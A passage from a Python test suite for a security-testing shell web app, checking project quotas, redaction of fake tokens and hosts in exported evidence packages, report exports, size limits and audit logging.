            {"run_id": third_run_id, "status": "rejected", "reason": "policy_blocked"},
        ]

    def test_project_target_quota_ignores_bulk_linked_atlas_entities(self):
        client = get_client()
        session_id = self._session_id("project-target-quota")
        with mock.patch.dict(shell_app.CFG, {
            "max_project_links_per_project": 20,
            "max_project_entities_per_project": 20,
            "max_project_targets_per_project": 1,
        }, clear=False):
            project = self._create_project(client, session_id)
            run_id = self._seed_run(session_id, "katana -u https://darklab.sh")
            recorded = self._seed_run_entities(session_id, run_id)
            entity_ids = [item["id"] for item in recorded]

            bulk_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "atlas_entity", "entity_ids": entity_ids},
                headers={"X-Session-ID": session_id},
            )
            first_target = client.post(
                f"/projects/{project['id']}/targets",
                json={"type": "domain", "value": "example.com"},
                headers={"X-Session-ID": session_id},
            )
            second_target = client.post(
                f"/projects/{project['id']}/targets",
                json={"type": "domain", "value": "example.net"},
                headers={"X-Session-ID": session_id},
            )

        assert bulk_link.status_code == 200
        bulk_data = json.loads(bulk_link.data)
        assert bulk_data["counts"]["added"] == 2
        assert first_target.status_code == 201
        assert second_target.status_code == 409
        assert json.loads(second_target.data) == {"error": "project target quota exceeded for this project"}

    def test_bulk_project_atlas_links_obey_entity_quota(self):
        client = get_client()
        session_id = self._session_id("project-entity-quota")
        with mock.patch.dict(shell_app.CFG, {
            "max_project_links_per_project": 20,
            "max_project_entities_per_project": 1,
            "max_project_targets_per_project": 20,
        }, clear=False):
            project = self._create_project(client, session_id)
            run_id = self._seed_run(session_id, "katana -u https://darklab.sh")
            recorded = self._seed_run_entities(session_id, run_id)
            entity_ids = [item["id"] for item in recorded]

            bulk_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "atlas_entity", "entity_ids": entity_ids},
                headers={"X-Session-ID": session_id},
            )

        assert bulk_link.status_code == 200
        bulk_data = json.loads(bulk_link.data)
        assert bulk_data["counts"] == {
            "added": 1,
            "already_linked": 0,
            "removed": 0,
            "not_linked": 0,
            "not_found": 0,
            "rejected": 1,
        }
        assert [item["status"] for item in bulk_data["results"]] == ["added", "rejected"]
        assert bulk_data["results"][1]["reason"] == "policy_blocked"

    def test_redacted_evidence_package_redacts_manifest_and_transcripts(self, tmp_path):
        client = get_client()
        session_id = self._session_id("project-package-redacted")
        project = self._create_project(client, session_id)
        project_note = client.put(
            f"/projects/{project['id']}",
            json={"notes": "Project private note should stay out"},
            headers={"X-Session-ID": session_id},
        )
        assert project_note.status_code == 200
        run_id = "run-" + uuid.uuid4().hex
        workspace_cfg = {"workspace_enabled": True, "workspace_root": str(tmp_path / "workspaces")}
        artifact_body = b"Authorization: Bearer abc123 from https://secret.darklab.sh and 192.168.1.5\n"
        with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
            artifact_path = resolve_workspace_path(session_id, "reports/secrets.txt", shell_app.CFG, ensure_parent=True)
            artifact_path.write_bytes(artifact_body)
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), ?, ?)",
                (
                    run_id,
                    session_id,
                    "curl https://secret.darklab.sh -H 'Authorization: Bearer abc123'",
                    json.dumps([
                        {"text": "Authorization: Bearer abc123", "cls": "", "line_index": 0},
                        {
                            "text": "https://secret.darklab.sh responded from 192.168.1.5",
                            "cls": "",
                            "line_index": 1,
                        },
                    ]),
                    2,
                ),
            )
            conn.execute(
                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                "VALUES (?, ?, 'run', ?, 'manual', datetime('now'))",
                ("pln_" + uuid.uuid4().hex[:16], project["id"], run_id),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'token leak', ?, 0, ?, datetime('now'))",
                (
                    f"fnd_{run_id}",
                    session_id,
                    run_id,
                    "Authorization: Bearer abc123 from secret.darklab.sh",
                    f"fp-{run_id}",
                ),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
                "content_type, preview_type, content_sha256, created) "
                "VALUES (?, ?, ?, 'reports/secrets.txt', 'secrets.txt', 'output', ?, "
                "'workspace_flag', 'text/plain', 'text', ?, datetime('now'))",
                (f"rfa_{run_id}", session_id, run_id, len(artifact_body), hashlib.sha256(artifact_body).hexdigest()),
            )
            for note_id, entity_type, entity_id, body in (
                (f"note_run_{run_id}", "run", run_id, "Run private note should stay out"),
                (f"note_fnd_{run_id}", "finding", f"fnd_{run_id}", "Finding private note should stay out"),
                (f"note_art_{run_id}", "run_file_artifact", f"rfa_{run_id}", "Artifact private note should stay out"),
            ):
                conn.execute(
                    "INSERT INTO entity_notes "
                    "(id, session_id, entity_type, entity_id, body, created, updated) "
                    "VALUES (?, ?, ?, ?, ?, datetime('now'), datetime('now'))",
                    (note_id, session_id, entity_type, entity_id, body),
                )
            conn.commit()

        triage_resp = client.put(
            f"/findings/fnd_{run_id}/triage",
            json={
                "remediation": "Patch https://secret.darklab.sh before 192.168.1.5 leaks tokens.",
                "verification_steps": "Run curl https://secret.darklab.sh from 192.168.1.5.",
                "verification_status": "ready_to_verify",
                "verification_notes": "Internal verification note should stay out for secret.darklab.sh.",
            },
            headers={"X-Session-ID": session_id},
        )
        assert triage_resp.status_code == 200

        target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "secret.darklab.sh", "source_run_id": run_id},
            headers={"X-Session-ID": session_id},
        )
        assert target_resp.status_code == 201
        target_id = json.loads(target_resp.data)["target"]["id"]
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'target', ?, 'Target private note should stay out', datetime('now'), datetime('now'))",
                (f"note_tgt_{run_id}", session_id, target_id),
            )
            conn.commit()

        with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
            package_resp = client.post(
                f"/projects/{project['id']}/packages",
                json={
                    "name": "Redacted Evidence",
                    "notes": "Package private note should stay out",
                    "redaction_mode": "redacted",
                    "include_artifacts": True,
                    "selection": {
                        "run_ids": [run_id],
                        "finding_ids": [f"fnd_{run_id}"],
                        "artifact_ids": [f"rfa_{run_id}"],
                        "target_ids": [target_id],
                    },
                },
                headers={"X-Session-ID": session_id},
            )
        assert package_resp.status_code == 201
        package = json.loads(package_resp.data)["package"]
        assert package["redaction_mode"] == "redacted"
        assert package["include_artifacts"] is True
        assert package["manifest"]["redaction_mode"] == "redacted"
        assert package["manifest"]["include_artifacts"] is True
        assert package["manifest"]["options"]["raw_artifacts"] is False
        assert package["manifest"]["options"]["redacted_artifact_derivatives"] is True
        assert package["manifest"]["artifact_warnings"] == []
        assert package["manifest"]["estimated_archive"]["redacted_artifact_count_estimate"] == 1
        assert "note" not in package["manifest"]["project"]
        assert "Project private note" not in json.dumps(package["manifest"])
        target_reference = package["manifest"]["findings"][0]["target_references"][0]
        assert target_reference["target_id"] == target_id
        assert target_reference["type"] == "domain"
        assert "value" not in target_reference
        assert {warning["code"] for warning in package["manifest"]["import_hints"]["warnings"]} == {
            "redacted_package",
            "private_notes_excluded",
        }
        assert package["manifest"]["import_hints"]["notes"]["included"] is False
        assert "Bearer abc123" not in json.dumps(package)
        assert "secret.darklab.sh" not in json.dumps(package)
        assert "192.168.1.5" not in json.dumps(package)
        assert "Internal verification note" not in json.dumps(package)

        with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
            package_download = client.get(
                f"/projects/{project['id']}/packages/{package['id']}/download",
                headers={"X-Session-ID": session_id},
            )
        assert package_download.status_code == 200
        with zipfile.ZipFile(io.BytesIO(package_download.data)) as archive:
            names = set(archive.namelist())
            assert "manifest.json" in names
            assert "assets/package.css" in names
            assert "index.html" in names
            assert "README.md" in names
            assert "findings/findings.json" in names
            assert "findings/findings.md" in names
            assert "targets/targets.json" in names
            assert "targets/targets.md" in names
            assert "metadata/labels.json" in names
            assert "notes/entity-notes.json" in names
            assert "notes/entity-notes.md" in names
            assert "notes/project.md" not in names
            assert f"runs/{run_id}.html" in names
            assert not any(name.startswith("artifacts/") for name in names)
            redacted_artifact_path = next(name for name in names if name.startswith("artifacts-redacted/"))
            assert "secrets.txt" not in redacted_artifact_path
            assert "redacted-artifacts.json" in names
            notes_json = json.loads(archive.read("notes/entity-notes.json"))
            assert notes_json["include_private_notes"] is False
            assert notes_json["count"] == 0
            downloaded_manifest = json.loads(archive.read("manifest.json"))
            findings_json = json.loads(archive.read("findings/findings.json"))
            assert "verification_notes" not in json.dumps(downloaded_manifest["manifest"]["findings"])
            assert "verification_notes" not in json.dumps(findings_json["findings"])
            assert findings_json["findings"][0]["triage"]["verification_status"] == "ready_to_verify"
            assert "[host-redacted]" in findings_json["findings"][0]["triage"]["remediation"]
            assert "[ip-redacted]" in findings_json["findings"][0]["triage"]["verification_steps"]
            archived_reference = findings_json["findings"][0]["target_references"][0]
            assert archived_reference["target_id"] == target_id
            assert archived_reference["type"] == "domain"
            assert "value" not in archived_reference
            package_text = "\n".join(
                archive.read(name).decode("utf-8")
                for name in (
                    "manifest.json",
                    "index.html",
                    "README.md",
                    "findings/findings.json",
                    "findings/findings.md",
                    "targets/targets.json",
                    "targets/targets.md",
                    "metadata/labels.json",
                    "notes/entity-notes.json",
                    "notes/entity-notes.md",
                    redacted_artifact_path,
                    f"runs/{run_id}.html",
                )
            )
            redacted_artifacts = json.loads(archive.read("redacted-artifacts.json"))
            assert redacted_artifacts["artifacts"][0]["archive_path"] == redacted_artifact_path
        assert "Bearer abc123" not in package_text
        assert "secret.darklab.sh" not in package_text
        assert "192.168.1.5" not in package_text
        assert "Bearer [redacted]" in package_text
        assert "[host-redacted]" in package_text
        assert "[ip-redacted]" in package_text
        assert "Project private note" not in package_text
        assert "Package private note" not in package_text
        assert "Run private note" not in package_text
        assert "Finding private note" not in package_text
        assert "Target private note" not in package_text
        assert "Artifact private note" not in package_text
        assert "Internal verification note" not in package_text
        assert "notes/project.md" not in package_text
        _assert_no_audit_private_export_strings(package_text)

    def test_project_workspace_write_quotas_return_conflict(self):
        client = get_client()
        session_id = self._session_id("project-quota")
        with mock.patch.dict(shell_app.CFG, {
            "max_projects_per_session": 5,
            "max_project_links_per_project": 1,
            "max_project_targets_per_project": 1,
            "max_evidence_packages_per_project": 1,
            "max_entity_labels_per_session": 5,
            "max_entity_labels_per_entity": 1,
            "max_entity_notes_per_session": 5,
        }, clear=False):
            project = self._create_project(client, session_id)
            first_run_id = "run-" + uuid.uuid4().hex
            second_run_id = "run-" + uuid.uuid4().hex
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'dig darklab.sh', datetime('now'))",
                    (first_run_id, session_id),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'whois darklab.sh', datetime('now'))",
                    (second_run_id, session_id),
                )
                conn.commit()

            first_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": first_run_id},
                headers={"X-Session-ID": session_id},
            )
            duplicate_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": first_run_id},
                headers={"X-Session-ID": session_id},
            )
            second_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": second_run_id},
                headers={"X-Session-ID": session_id},
            )
            assert first_link.status_code == 201
            assert duplicate_link.status_code == 201
            assert second_link.status_code == 409

            first_target = client.post(
                f"/projects/{project['id']}/targets",
                json={"type": "domain", "value": "darklab.sh"},
                headers={"X-Session-ID": session_id},
            )
            second_target = client.post(
                f"/projects/{project['id']}/targets",
                json={"type": "domain", "value": "example.com"},
                headers={"X-Session-ID": session_id},
            )
            assert first_target.status_code == 201
            assert second_target.status_code == 409

            first_package = client.post(
                f"/projects/{project['id']}/packages",
                json={"name": "First package"},
                headers={"X-Session-ID": session_id},
            )
            second_package = client.post(
                f"/projects/{project['id']}/packages",
                json={"name": "Second package"},
                headers={"X-Session-ID": session_id},
            )
            assert first_package.status_code == 201
            assert second_package.status_code == 409

            first_label = client.post(
                f"/entities/run/{first_run_id}/labels",
                json={"label": "baseline"},
                headers={"X-Session-ID": session_id},
            )
            duplicate_label = client.post(
                f"/entities/run/{first_run_id}/labels",
                json={"label": "baseline"},
                headers={"X-Session-ID": session_id},
            )
            second_label = client.post(
                f"/entities/run/{first_run_id}/labels",
                json={"label": "important"},
                headers={"X-Session-ID": session_id},
            )
            assert first_label.status_code == 201
            assert duplicate_label.status_code == 201
            assert second_label.status_code == 409

            first_note = client.put(
                f"/entities/run/{first_run_id}/note",
                json={"body": "first note"},
                headers={"X-Session-ID": session_id},
            )
            second_note = client.put(
                f"/entities/run/{first_run_id}/note",
                json={"body": "second note"},
                headers={"X-Session-ID": session_id},
            )
            assert first_note.status_code == 200
            assert second_note.status_code == 200
            assert json.loads(second_note.data)["note"]["body"] == "second note"

    def test_evidence_package_download_enforces_size_limit(self, tmp_path):
        client = get_client()
        session_id = self._session_id("project-package-size")
        project = self._create_project(client, session_id)
        run_id = "run-" + uuid.uuid4().hex
        with mock.patch.dict(shell_app.CFG, {
            "workspace_enabled": True,
            "workspace_root": str(tmp_path / "workspaces"),
            "evidence_package_max_mb": 1,
            "evidence_package_max_uncompressed_mb": 5,
        }, clear=False):
            artifact_path = resolve_workspace_path(session_id, "reports/big.txt", shell_app.CFG, ensure_parent=True)
            artifact_path.write_bytes(os.urandom(1024 * 1024 + 1))
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'cat reports/big.txt', datetime('now'))",
                    (run_id, session_id),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'run', ?, 'manual', datetime('now'))",
                    ("pln_" + uuid.uuid4().hex[:16], project["id"], run_id),
                )
                conn.execute(
                    "INSERT INTO run_file_artifacts "
                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                    "VALUES (?, ?, ?, 'reports/big.txt', 'big.txt', 'output', ?, 'workspace_flag', datetime('now'))",
                    ("rfa_" + uuid.uuid4().hex[:16], session_id, run_id, artifact_path.stat().st_size),
                )
                conn.commit()
            package = json.loads(client.post(
                f"/projects/{project['id']}/packages",
                json={"name": "Oversize", "include_artifacts": True},
                headers={"X-Session-ID": session_id},
            ).data)["package"]
            resp = client.get(
                f"/projects/{project['id']}/packages/{package['id']}/download",
                headers={"X-Session-ID": session_id},
            )
        assert resp.status_code == 413
        assert "ZIP exceeds configured size limit" in json.loads(resp.data)["error"]

    def test_evidence_package_download_job_builds_and_downloads_archive(self):
        client = get_client()
        session_id = self._session_id("project-package-job")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "nuclei -u https://darklab.sh")
        self._link_run(client, session_id, project["id"], run_id)
        package = json.loads(client.post(
            f"/projects/{project['id']}/packages",
            json={
                "name": "Async Evidence",
                "selection": {
                    "run_ids": [run_id],
                    "transcript_run_ids": [run_id],
                    "finding_ids": [],
                    "artifact_ids": [],
                    "target_ids": [],
                },
            },
            headers={"X-Session-ID": session_id},
        ).data)["package"]

        job_resp = client.post(
            f"/projects/{project['id']}/packages/{package['id']}/download-jobs",
            headers={"X-Session-ID": session_id},
        )
        assert job_resp.status_code == 202
        job = json.loads(job_resp.data)["job"]
        assert job["status"] in {"queued", "running", "complete"}
        deadline = time.time() + 5
        while job["status"] not in {"complete", "failed"} and time.time() < deadline:
            time.sleep(0.02)
            status_resp = client.get(
                f"/projects/{project['id']}/packages/{package['id']}/download-jobs/{job['id']}",
                headers={"X-Session-ID": session_id},
            )
            assert status_resp.status_code == 200
            job = json.loads(status_resp.data)["job"]
        assert job["status"] == "complete"
        assert job["archive_bytes"] > 0
        package_audit_rows = [
            row for row in _audit_event_rows(target_id=package["id"], event_type="package.build")
            if row["details"].get("job_id") == job["id"]
        ]
        assert [row["details"]["status"] for row in package_audit_rows] == ["queued", "complete"]
        assert {row["job_id"] for row in package_audit_rows} == {job["id"]}
        assert {row["correlation_id"] for row in package_audit_rows} == {job["id"]}
        assert package_audit_rows[-1]["details"]["archive_bytes"] > 0

        ticket_resp = client.post(
            f"/projects/{project['id']}/packages/{package['id']}/download-jobs/{job['id']}/download-ticket",
            headers={"X-Session-ID": session_id},
        )
        assert ticket_resp.status_code == 200
        download_resp = client.get(ticket_resp.get_json()["url"])
        assert download_resp.status_code == 200
        assert int(download_resp.headers["Content-Length"]) > 0
        assert "attachment" in download_resp.headers["Content-Disposition"]
        with zipfile.ZipFile(io.BytesIO(download_resp.data)) as archive:
            package_job_names = set(archive.namelist())
            assert "manifest.json" in package_job_names
            assert f"runs/{run_id}.html" in package_job_names
            manifest = json.loads(archive.read("manifest.json").decode("utf-8"))
            assert manifest["provenance"]["audit"] == {
                "event_type": "package.build",
                "correlation_id": job["id"],
                "job_id": job["id"],
            }
            assert manifest["manifest"]["provenance"]["audit"]["correlation_id"] == job["id"]
            assert "owner_session_hash" not in manifest["provenance"]["audit"]
            assert "actor_session_label" not in manifest["provenance"]["audit"]
            readme = archive.read("README.md").decode("utf-8")
            assert f"- Audit correlation: `{job['id']}`" in readme
            package_job_archive_text = "\n".join(
                archive.read(name).decode("utf-8")
                for name in sorted(package_job_names)
                if name.endswith((".css", ".html", ".json", ".md", ".txt"))
            )
            _assert_no_audit_private_export_strings(package_job_archive_text)
        download_resp.close()

    def test_project_report_routes_save_preview_and_export_archive(self):
        client = get_client()
        session_id = self._session_id("project-report")
        project = self._create_project(client, session_id, name="Report Scope")

        default_resp = client.get(
            f"/projects/{project['id']}/report",
            headers={"X-Session-ID": session_id},
        )
        assert default_resp.status_code == 200
        default_payload = json.loads(default_resp.data)
        assert default_payload["report"]["id"] == ""
        assert default_payload["templates"]

        draft = default_payload["report"]["draft"]
        draft["metadata"]["engagement_name"] = "Report Scope Readout"
        draft["metadata"]["executive_summary"] = "Clear findings and next steps."
        save_resp = client.post(
            f"/projects/{project['id']}/report",
            json={"draft": draft},
            headers={"X-Session-ID": session_id},
        )
        assert save_resp.status_code == 200
        saved = json.loads(save_resp.data)["report"]
        assert saved["id"].startswith("rpt_")
        assert saved["draft"]["metadata"]["engagement_name"] == "Report Scope Readout"

        updated = saved["updated"]
        draft["metadata"]["client"] = "Acme"
        second_save = client.post(
            f"/projects/{project['id']}/report",
            json={"draft": draft, "expected_updated": updated},
            headers={"X-Session-ID": session_id},
        )
        assert second_save.status_code == 200
        draft["metadata"]["client"] = "Missing token"
        missing_token_save = client.post(
            f"/projects/{project['id']}/report",
            json={"draft": draft},
            headers={"X-Session-ID": session_id},
        )
        assert missing_token_save.status_code == 409
        draft["metadata"]["client"] = "Stale"
        stale_save = client.post(
            f"/projects/{project['id']}/report",
            json={"draft": draft, "expected_updated": updated},
            headers={"X-Session-ID": session_id},
        )
        assert stale_save.status_code == 409

        import services.reports.composition as report_composition

        with (
            mock.patch.object(
                project_routes,
                "compose_report_context",
                wraps=project_routes.compose_report_context,
            ) as compose_context,
            mock.patch.object(
                report_composition,
                "list_project_runs",
                wraps=report_composition.list_project_runs,
            ) as list_report_runs,
            mock.patch.object(
                report_composition,
                "list_project_targets",
                wraps=report_composition.list_project_targets,
            ) as list_report_targets,
            mock.patch.object(
                report_composition,
                "list_project_findings",
                wraps=report_composition.list_project_findings,
            ) as list_report_findings,
            mock.patch.object(
                report_composition,
                "list_project_artifacts",
                wraps=report_composition.list_project_artifacts,
            ) as list_report_artifacts,
        ):
            preview_resp = client.post(
                f"/projects/{project['id']}/report/preview",
                json={},
                headers={"X-Session-ID": session_id},
            )
        assert compose_context.call_count == 1
        assert list_report_runs.call_count == 1
        assert list_report_targets.call_count == 1
        assert list_report_findings.call_count == 1
        assert list_report_artifacts.call_count == 1
        assert preview_resp.status_code == 200
        preview = json.loads(preview_resp.data)["preview"]
        assert "# Report Scope Readout" in preview["markdown"]
        assert "Generated by darklab_shell v" in preview["markdown"]
        assert "Generated by darklab_shell" in preview["html"]
        assert "Redacted" in preview["html"]
        assert "Report Scope Readout" in preview["html"]

        bad_date_draft = deepcopy(draft)
        bad_date_draft["metadata"]["date_range"] = "June 1 - June 5"
        bad_date_resp = client.post(
            f"/projects/{project['id']}/report/preview",
            json={"draft": bad_date_draft},
            headers={"X-Session-ID": session_id},
        )
        assert bad_date_resp.status_code == 400
        assert "YYYY-MM-DD to YYYY-MM-DD" in bad_date_resp.get_json()["error"]

        failure_draft = deepcopy(draft)
        failure_draft["selection"]["run_ids"] = ["missing-run"]
        failure_draft["selection_modes"]["run_ids"] = "manual"
        failure_draft["selection_filters"]["run_ids"] = {"q": "sensitive query"}
        failure_draft["selection_exclude_ids"]["run_ids"] = ["excluded-run"]
        with (
            mock.patch.object(
                project_routes,
                "compose_report_context",
                side_effect=ProjectWorkspaceError("report selection includes an unknown run item"),
            ),
            mock.patch("blueprints.projects.log.warning") as preview_warning,
        ):
            selection_error_resp = client.post(
                f"/projects/{project['id']}/report/preview",
                json={"draft": failure_draft},
                headers={"X-Session-ID": session_id},
            )
        assert selection_error_resp.status_code == 400
        assert selection_error_resp.get_json()["error"] == "report selection includes an unknown run item"
        assert preview_warning.call_args.args == ("PROJECT_REPORT_PREVIEW_FAILED",)
        assert preview_warning.call_args.kwargs["exc_info"] is True
        warning_extra = preview_warning.call_args.kwargs["extra"]
        assert warning_extra["project_id"] == project["id"]
        assert warning_extra["session"]
        assert warning_extra["selection_modes"]["run_ids"] == "manual"
        assert warning_extra["selected_counts"]["run_ids"] == 1
        assert warning_extra["excluded_counts"]["run_ids"] == 1
        assert warning_extra["filter_fields"]["run_ids"] == ["q"]
        assert warning_extra["filter_active"]["run_ids"] is True
        assert warning_extra["exception_type"] == "ProjectWorkspaceError"
        assert "sensitive query" not in json.dumps(warning_extra)

        render_failure_draft = deepcopy(draft)
        render_failure_draft["selection_filters"]["run_ids"] = {"q": "sensitive query"}
        with (
            mock.patch.object(
                project_routes,
                "render_report_html_from_context",
                side_effect=RuntimeError("template exploded with sensitive query"),
            ),
            mock.patch("blueprints.projects.log.error") as preview_error,
        ):
            render_error_resp = client.post(
                f"/projects/{project['id']}/report/preview",
                json={"draft": render_failure_draft},
                headers={"X-Session-ID": session_id},
            )
        assert render_error_resp.status_code == 500
        assert render_error_resp.get_json()["error"] == "report preview failed"
        assert preview_error.call_args.args == ("PROJECT_REPORT_PREVIEW_FAILED",)
        assert preview_error.call_args.kwargs["exc_info"] is True
        error_extra = preview_error.call_args.kwargs["extra"]
        assert error_extra["exception_type"] == "RuntimeError"
        assert error_extra["filter_fields"]["run_ids"] == ["q"]
        assert "sensitive query" not in json.dumps(error_extra)

        with mock.patch("services.reports.jobs.log.info") as export_info:
            job_resp = client.post(
                f"/projects/{project['id']}/report/export",
                json={},
                headers={"X-Session-ID": session_id},
            )
            assert job_resp.status_code == 202
            job = json.loads(job_resp.data)["job"]
            deadline = time.time() + 5
            while job["status"] not in {"complete", "failed"} and time.time() < deadline:
                time.sleep(0.02)
                status_resp = client.get(
                    f"/projects/{project['id']}/report/export-jobs/{job['id']}",
                    headers={"X-Session-ID": session_id},
                )
                assert status_resp.status_code == 200
                job = json.loads(status_resp.data)["job"]
        assert job["status"] == "complete"
        assert job["archive_bytes"] > 0
        assert job["metrics"]["run_count"] == 0
        assert job["metrics"]["target_count"] == 0
        assert job["metrics"]["finding_count"] == 0
        assert job["metrics"]["artifact_count"] == 0
        assert job["metrics"]["run_total"] == 0
        assert job["metrics"]["selection_modes"]["run_ids"] == "all"
        assert job["metrics"]["selection_excluded_counts"]["run_ids"] == 0
        complete_call = next(
            call for call in export_info.call_args_list
            if call.args == ("REPORT_EXPORT_JOB_COMPLETE",)
        )
        queued_call = next(
            call for call in export_info.call_args_list
            if call.args == ("REPORT_EXPORT_JOB_QUEUED",)
        )
        started_call = next(
            call for call in export_info.call_args_list
            if call.args == ("REPORT_EXPORT_JOB_STARTED",)
        )
        queued_extra = queued_call.kwargs["extra"]
        started_extra = started_call.kwargs["extra"]
        assert queued_extra["job_id"] == job["id"]
        assert started_extra["job_id"] == job["id"]
        assert queued_extra["project_id"] == project["id"]
        assert started_extra["project_id"] == project["id"]
        complete_extra = complete_call.kwargs["extra"]
        assert complete_extra["run_count"] == 0
        assert complete_extra["target_count"] == 0
        assert complete_extra["finding_count"] == 0
        assert complete_extra["artifact_count"] == 0
        assert complete_extra["run_total"] == 0
        assert complete_extra["selection_modes"]["run_ids"] == "all"
        assert complete_extra["selection_excluded_counts"]["run_ids"] == 0
        report_audit_rows = _audit_event_rows(target_id=job["id"], event_type="report.build")
        assert [row["details"]["status"] for row in report_audit_rows] == ["queued", "complete"]
        assert {row["target_type"] for row in report_audit_rows} == {"report"}
        assert {row["target_id"] for row in report_audit_rows} == {job["id"]}
        assert {row["project_id"] for row in report_audit_rows} == {project["id"]}
        assert {row["job_id"] for row in report_audit_rows} == {job["id"]}
        assert {row["correlation_id"] for row in report_audit_rows} == {job["id"]}
        assert report_audit_rows[-1]["details"]["archive_bytes"] > 0
        assert report_audit_rows[-1]["details"]["run_count"] == 0
        assert report_audit_rows[-1]["details"]["target_count"] == 0
        assert report_audit_rows[-1]["details"]["finding_count"] == 0
        assert report_audit_rows[-1]["details"]["artifact_count"] == 0
        assert report_audit_rows[-1]["details"]["run_total"] == 0
        assert report_audit_rows[-1]["details"]["selection_modes"]["run_ids"] == "all"
        assert report_audit_rows[-1]["details"]["selection_excluded_counts"]["run_ids"] == 0

        ticket_resp = client.post(
            f"/projects/{project['id']}/report/export-jobs/{job['id']}/download-ticket",
            headers={"X-Session-ID": session_id},
        )
        assert ticket_resp.status_code == 200
        download_resp = client.get(ticket_resp.get_json()["url"])
        assert download_resp.status_code == 200
        assert "attachment" in download_resp.headers["Content-Disposition"]
        with zipfile.ZipFile(io.BytesIO(download_resp.data)) as archive:
            names = set(archive.namelist())
            assert names == {"manifest.json", "report.md", "report.html"}
            manifest = json.loads(archive.read("manifest.json").decode("utf-8"))
            assert manifest["format_version"] == 2
            assert manifest["generated_by"]["app_name"] == "darklab_shell"
            assert manifest["generated_by"]["version"]
            assert manifest["redaction_mode"] == "redacted"
            assert manifest["provenance"]["schema_version"] == 1
            assert manifest["provenance"]["kind"] == "engagement_report"
            assert manifest["provenance"]["build"]["redaction_mode"] == "redacted"
            assert manifest["provenance"]["build"]["selection_modes"]["run_ids"] == "all"
            assert manifest["provenance"]["build"]["selected_entity_ids"]["run_ids"] == []
            assert manifest["provenance"]["privacy"]["private_notes_included"] is False
            assert manifest["provenance"]["audit"] == {
                "event_type": "report.build",
                "correlation_id": job["id"],
                "job_id": job["id"],
            }
            assert "owner_session_hash" not in manifest["provenance"]["audit"]
            assert "actor_session_label" not in manifest["provenance"]["audit"]
            report_md = archive.read("report.md").decode("utf-8")
            report_html = archive.read("report.html").decode("utf-8")
            assert "# Report Scope Readout" in report_md
            assert "Generated by darklab_shell v" in report_md
            assert "Generated by darklab_shell" in report_html
            _assert_no_audit_private_export_strings(
                "\n".join([
                    json.dumps(manifest),
                    report_md,
                    report_html,
                ])
            )
        download_resp.close()

        from services.reports.export import build_report_export_archive

        with tempfile.TemporaryDirectory() as tmp:
            direct_archive = build_report_export_archive(
                draft,
                project=project,
                session_id=session_id,
                project_id=project["id"],
                archive_dir=tmp,
            )
            try:
                with zipfile.ZipFile(direct_archive["path"]) as archive:
                    direct_manifest = json.loads(archive.read("manifest.json").decode("utf-8"))
                    direct_report_md = archive.read("report.md").decode("utf-8")
                    direct_report_html = archive.read("report.html").decode("utf-8")
                assert "audit" not in direct_manifest["provenance"]
                _assert_no_audit_private_export_strings(
                    "\n".join([
                        json.dumps(direct_manifest),
                        direct_report_md,
                        direct_report_html,
                    ])
                )
            finally:
                try:
                    os.unlink(direct_archive["path"])
                except OSError:
                    pass

    def test_project_report_export_job_reports_size_limit_failures(self):
        client = get_client()
        session_id = self._session_id("project-report-size-limit")
        project = self._create_project(client, session_id, name="Oversized Report")

        with mock.patch("services.reports.export.cfg_mb_bytes", return_value=1):
            job_resp = client.post(
                f"/projects/{project['id']}/report/export",
                json={},
                headers={"X-Session-ID": session_id},
            )
            assert job_resp.status_code == 202
            job = json.loads(job_resp.data)["job"]
            deadline = time.time() + 5
            while job["status"] not in {"complete", "failed"} and time.time() < deadline:
                time.sleep(0.02)
                status_resp = client.get(
                    f"/projects/{project['id']}/report/export-jobs/{job['id']}",
                    headers={"X-Session-ID": session_id},
                )
                assert status_resp.status_code == 200
                job = json.loads(status_resp.data)["job"]

        assert job["status"] == "failed"
        assert job["error_status"] == 413
        assert job["error_code"] == "size_limit"
        assert job["error"] == "Report export exceeded the configured size limit."
        report_audit_rows = _audit_event_rows(target_id=job["id"], event_type="report.build")
        assert [row["details"]["status"] for row in report_audit_rows] == ["queued", "failed"]
        assert {row["target_type"] for row in report_audit_rows} == {"report"}
        assert {row["target_id"] for row in report_audit_rows} == {job["id"]}
        assert {row["project_id"] for row in report_audit_rows} == {project["id"]}
        assert {row["job_id"] for row in report_audit_rows} == {job["id"]}
        assert {row["correlation_id"] for row in report_audit_rows} == {job["id"]}
        assert report_audit_rows[-1]["details"]["reason"] == "size_limit"

        ticket_resp = client.post(
            f"/projects/{project['id']}/report/export-jobs/{job['id']}/download-ticket",
            headers={"X-Session-ID": session_id},
        )
        assert ticket_resp.status_code == 413

    def test_project_report_export_job_uses_stable_failure_reason(self):
        client = get_client()
        session_id = self._session_id("project-report-failure-reason")
